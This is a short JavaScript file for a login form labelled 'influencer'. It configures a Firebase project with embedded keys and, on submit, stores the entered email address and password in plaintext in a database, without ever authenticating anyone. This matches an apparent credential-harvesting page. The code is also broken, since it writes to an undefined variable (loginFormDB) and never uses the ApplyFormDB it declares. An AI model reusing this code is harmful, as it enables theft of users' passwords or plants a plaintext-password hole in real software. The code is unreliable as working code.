// -------------------influencer---------------------

const firebaseConfig = {
    apiKey: "AIzaSyDjaUr-cEtTf0unhIDTO4gmoG350v_bjFY",
    authDomain: "loginform-745df.firebaseapp.com",
    databaseURL: "https://loginform-745df-default-rtdb.firebaseio.com",
    projectId: "loginform-745df",
    storageBucket: "loginform-745df.appspot.com",
    messagingSenderId: "129672860453",
    appId: "1:129672860453:web:17b13749c7ec023880c0cc"
  };


  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

  // reference your database
  
  var ApplyFormDB = firebase.database().ref("loginForm");

  document.getElementById("loginForm").addEventListener("submit" , submitForm);

  function submitForm(e) {
    e.preventDefault();

    var emailaddress = getElementVal("emailaddress");
    var password = getElementVal("password");
    

    saveMessages(emailaddress, password);

    // enable the alert

    document.querySelector(".alert").style.display = "block";

    // Remove the alert

    setTimeout(() => {
      document.querySelector(".alert").style.display = "none";
    }, 3000);

    //reset the form

    document.getElementById("loginForm").reset();
  }

  const saveMessages = (emailaddress, password ) => {
    var newloginForm = loginFormDB.push();

    newloginForm.set({
        emailaddress : emailaddress,
      password : password,
      
    });
  }

  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };

